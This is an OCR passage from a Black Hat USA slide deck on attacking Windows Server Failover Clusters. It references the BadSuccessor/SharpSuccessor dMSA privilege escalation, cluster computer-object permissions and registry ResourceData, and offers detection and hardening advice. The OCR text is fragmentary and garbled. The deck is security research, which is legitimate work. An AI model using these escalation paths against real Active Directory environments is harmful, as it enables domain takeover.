ForeignSecurityPrincipals_ | Computers Pr Prestage Computer Object for the Cluster Name
Keys
# Full control and permission on the cluster container
Before you walk through thiv “> * *"
like to pl Step 5: Prestage Computer Object for the Cluster Aware Updating Server
ou don't complete this ste .
y P | objects. thers de The official automatic creation way
as well as issues wit
1. Give the CNO Create computer objects, list properties, read properties, write properties
aver tha O11 it racidac in
e Give the CNO: create computer objects, list properties, read propertips, write properties over the OU it resides in
¢ Create the listener through SSMS/TSQL/Powershell
4 zomputer account Full Control
permissions to the Organizational Unit.|AFter you've created the account, disable it as shown in the first ADUC
screenshot. Otherwise, CAU won't be able to activate it.
```

## Slide 111

#BHUSA @BlackHatEvents

## Slide 112

#BHUSA @BlackHatEvents

## Slide 113

#BHUSA @BlackHatEvents

## Slide 114

#BHUSA @BlackHatEvents

## Slide 115

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BadSuccessor: Abusing dMSA to Escalate
Privileges in Active Directory
my Yuval Gordon
§ May 21, 2025
By abusing dMSAs, attackers can take over any principal in the
domain.
Executive summary
¢ Akamai researcher Yuval Gordon discover’ tyin
Windows Server 2025 that allows attacke! p Directory
(AD).
¢ The attack exploits the delegated | vice ount (MSA) teature that was
introduced in Windows Server 2025, works with the default configuration, and is trivial
to implement.
```

## Slide 116

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
& SharpSuccessor Punic @Watch 4 ~
® master ~ 1Branch © 0 Tags Q Gotofile t Addfile ~ | <> Code ~
& 'ogangoins Merge branch 'master' of ht ith 7 r 58aa5b1:2months ago ©) 13 Commits
Shae Hi X Bm SharpSuccessor Updated flags for clairity 2 months ago
{ .gitattributes Add .gitattributes, .gitignore, and README.md 2 months ago
Q) .gitignore Add .gitattributes, .gitignore, and README.md. 2 months ago
(3 README.md Updated with new flags 2 months ago
( SharpSuccessor.sin Add project files. 2 months ago
( README C=
By abusing dMSAs, attackers can take over any principal in the
domain.
SharpSuccessor
SharpSuccessor is a .NET Proof of Concept (POC) for fully weaponizing Yuval Gordon's (@YuGOrd) Bac 2SS¢
attack from Akamai. A low privilege user with CreateChild permissions ove:
Active Directory domain can escalate privileges to domain administrator.
Use SharpSuccessor to add and weaponize the dMSA object, setting the acd
ser
context:
Executive summa y ’
¢ Akamai researcher Yuval Gordon discover’ tyin
Windows Server 2025 that allows attacke! p Directory
(AD).
introduced in Windows Server 2025, works with the default configuration, and is trivial
to implement.
¢ The attack exploits the delegated Mana oni Acc 5 ;
[+] Adding dn
```

## Slide 117

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Learn / Windows Server / Identity and access / | Ask Learn | | 60 Focus mode
Setting up an AD FS Deployment with
AlwaysOn Availability Groups
04/08/2025 * Applies to: & Windows Server 2025, & Windows Server 2022, & Windows Server 2019, @ Windows Server 2016
A highly available geo-distributed topology provides:
¢ Elimination of a single point of failure: With failover capabilities, you can achieve a highly available AD FS
infrastructure even if one of the data centers in a part of a globe goes down.
¢ Improved performance: You can use the suggested deployment to provide a high-performance AD FS infrastructure
AD FS can be configured for a highly available geo-distributed scenario. The following guide will walk through an
overview of AD FS with SQL Always on Availability Groups and provide deployment considerations and guidance.
```

## Slide 118

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ask Learn | 60 Focus mode
Taking the "B" Out of DBA:
An Unconventional Attack
_ Path Against AD FS Through
~~" Database Administration
A hig hl Max Keasley @emkay64
° El
in
overview of AD FS with SQL Always on Availability Groups and provide deployment considerations and guidance.
#BHUSA
@BlackHatEvents
```

## Slide 119

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Learn / Windows Server / Identity and access / [ Ask Learn ] [ 62 Focus mode ]
Setting up an
AlwaysOn Avi
04/08/2025 + Applies to: &@ Windows S
A highly available geo-distributed
© Elimination of a single point:
infrastructure even if one of t
* Improved performance: You «
AD FS can be configured for a higt
overview of AD FS with SQL Alway
Manage database availability groups in
Exchange Server
04/30/2025
APPLIES TO: @2016 ©2019 @subscription Edition
A database availability group (DAG) is a set of upto 16 Exchange Mailbox servers that provide automatic, database-level
recovery from a database/server/network failure. DAGs use continuous replication and a subset of Windows failover
clustering technologies to provide high availability and site resilience. Mailbox servers in a DAG monitor each other for
failures. When a Mailbox server is added to a DAG, that server works with the other servers in the DAG to provide
automatic, database-level recovery from database failures.
When you create a DAG, it's initially empty. When you add the first server to a DAG, a failover cluster is automatically
created for the DAG. In addition, the infrastructure that monitors the servers for network or server failures is initiated. The
failover cluster heartbeat mechanism and cluster database are then used to track and manage information about the
DAG which can change quickly, such as database mount status, replication status, and last-mounted location.
```

## Slide 120

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Learn / Windows Server / Identity and access / Ask Learn 68 Focus mode
Manage database availability groups in
Exchange Server
04/30/2025
Setting up an AD FS Deployment with
AlwaysOn Availability Groups
04/08/2025 + Applies t
oeinicfena Use a SQL Server Always On solution for the site database ct
yer for
infrastructure ¢
* Improved perfi
Configuration Manager supports the following SQL Server Always On solutions for the site database:
AD FS can be config cally
overview of AD FS w ated. The
¢ Host the site database at primary sites and the central administration site in an availability group. For more tthe
information, see Prepare to use a SQL Server Always On availability group.
e Use a failover cluster instance for the database at a central administration site or primary site. For more information,
see Use a SQL Server Always On failover cluster instance.
Secondary sites can't use SQL Server Always On, and don't support backup or restoration of their site database. Recover
a secondary site by reinstalling the secondary site from its parent primary site.
```

## Slide 121

#BHUSA @BlackHatEvents

## Slide 122

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Learn / Windows Server / Identity and access / Ry oo
lw Windows Server System y groups in
Setting up an AD FS
AlwaysOn Availabilit
04/08/2025 + Applies to: & Window ver 2025, & Wind
A highly available geo-distributed topology provides} —
¢ Elimination of a single point of failure: With failq
infrastructure even if one of the data centers in ;
¢ Improved performance: You can use the suggeg
®
e
AD FS can be configured for a highly available geo-d W er to a DAG, a failover cluster is automatically
overview of AD FS with SQL Always on Availability Gr | N OWS eC rve r ? @ @ 8 ervers for network or server failures is initiated. The
ed to track and manage information about the
tion status, and last-mounted location.
bx servers that provide automatic, database-level
B replication and a subset of Windows failover
jailbox servers in a DAG monitor each other for
ith the other servers in the DAG to provide
Failover Clustering and Active Directory Certificate
Services in Windows Server 2008 and
Windows Server 2008 R2
Microsoft Corporation
Published: January 2010
By Carsten B. Kinder & Mark B. Cooper
```

## Slide 123

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
secondary site by reinstalling the secondary site from its parent primary site
```

## Slide 124

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ForeiguSecu Principals Computers Pr Prestage Computer Object for the Cluster Name
LostAndFound General Obje # Full control and permission on the cluster container
Managed
Program Step 5:
System
Users Customize the permission Hee I select the Write and Create all child
NTDSQ 5
computer object resides.
- Add the Windows Cluster Name Object (CNO) and cluster nodes having “FULL Control” in the ACLs on the F write properties
Security tab of the created Listener computer object record.
Error Message:
¢ Give the CNO: create co : ool
¢ Create the listener thro = nO ga 7
Siete! Delegation of Control Wizard xi
IF youre going to pre-stage the account, you need ta assign the cluster’s computer account Full Control
permissions to the Organizational Unit.|AFter you've created the account, disable it as shown in the first ADUC
screenshot. Otherwise, CAU won't be able to activate it.
```

## Slide 125

##### Audit cluster virtual accounts

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS a
Audit cluster virtual accounts
9. Under Permissions, select the Create Computer objects check box.
```

## Slide 126

##### Audit cluster virtual accounts Remove excessive permissions

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat eG
Audit cluster virtual accounts
9. Under Permissions, select the Create Computer objects check box.
Remove excessive permissions
```

## Slide 127

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Process x64dbg
Hacker 2
Informer
=
accesschk64 Windows
Cluster
Rubeus.exe
oT] e here to search
File Action View Help
Failover Cluster Manager
Role
| Storage
N
fs] Cluster Events
Cluster cluster.ludus.domain
High Availability Wizard
Client Access Point
Before You Begin Type the name that clients will use when accessing this clustered role:
Name:
The NetBIOS name is limited to 15 characters. One or more IPv4 addresses could not be configured
© automatically. For each network to be used, make sure the n elected, and then type an
address.
® Cluster Core Resources
Name Status Information
Storage
Configure Role.
Validate Cluster...
View Validation Report
Add Node...
Close Connection
Reset Recent Events
More Actions
View
Ref
Properties
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
5:34 PM
```

## Slide 128

##### DHCP Reservation

**#BHUSA @BlackHatEvents**


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
More Actions
The NetBIOS name is limited to 15 characters. One or more IPv4 addresses could not be configured ;
©) automatically. For each network to be used, make sure the network is selected, and then type an View
address.
Refresh
Networks Properties
Help
```

## Slide 129

##### DHCP Reservation

##### Detect authentication from different source address

**#BHUSA @BlackHatEvents**


> Recovered by OCR — confidence 95/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DHCP Reservation
More Actions
The NetBIOS name is limited to 15 characters. One or more IPv4 addresses could not be configured ;
© automatically. For each network to be used, make sure the network is selected, and then type an View
address.
Refresh
Networks Properties
Help
Detect authentication from
different source address
```

## Slide 130

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recycle Bin CIM Explorer
2025
Fl
Process x64dbg
Hacker 2
Informer
accesschk64 Windows
Rubeus.exe evandecry...
oT] e here to search
| BB Registry Editor
Ht File
Failover Cluster Mana
Roles
ca Storage
Networks
£3] Cluster
Edit
HKEY_LOCAL_MACHINE
Viev
8 (Default)
DAware
_ HostRecordTTL REG_DWORD
Checkpoints a8) Name REG SZ
Collections ab] ObjectGUID REG_SZ
FaultDomains
0.Cluster
3) RemapPipeNames
Groups ResourceData
Localldentity
Networkinterfaces
Networks
ObjectDependencies
Parameters
Quorum
Resources
10413b10-2d5e-415 0-a8bct
Parameters
Parameters
Resourcely
Spaceport
Storageobs
StorageNodes
StorageSubsystemPolicies
Ta
Telemetry
Data
(value not set)
(1200)
2df5F (133
CLUSTER
Actions
Roles
Configure Role...
Virtual Mac
Create Empty
View
Name: cluster-share
Take Offline
Show Critical Events
Windows Server 2022 Standard Evaluation
Windows License valid for 167 days
Build 20348.fe_release.210507-1500
1:50 AM
```

## Slide 131

##### Only the ClusSvc reads the value of ResourceData

**#BHUSA @BlackHatEvents**

## Slide 132

##### Only the ClusSvc reads the value of ResourceData Detect access attempts from any other principal

**#BHUSA @BlackHatEvents**

## Slide 133

##### Only the ClusSvc reads the value of ResourceData Detect access attempts from any other principal

**#BHUSA @BlackHatEvents**

## Slide 134

##### BlackHat Sound Bytes

**#BHUSA @BlackHatEvents**

## Slide 135

##### Own the node, Own the Cluster

**#BHUSA @BlackHatEvents**

## Slide 136

##### Cluster misconfigurations can lead to compromise

**#BHUSA @BlackHatEvents**

## Slide 137

##### If the clustered service is tier 0, so are the cluster resources

**#BHUSA @BlackHatEvents**

## Slide 138

### Thank you

@unsigned_sh0rt

**#BHUSA @BlackHatEvents**

## Companion resources

### `Garrett Foster_Clustered Points of Failure - Attacking Windows Server Failover Clusters_TOOLS.txt`

```text
https://gist.github.com/EvanMcBroom/a63f17466c7d1ab8b11ae80e520287ce

https://github.com/garrettfoster13/fustercluck
```
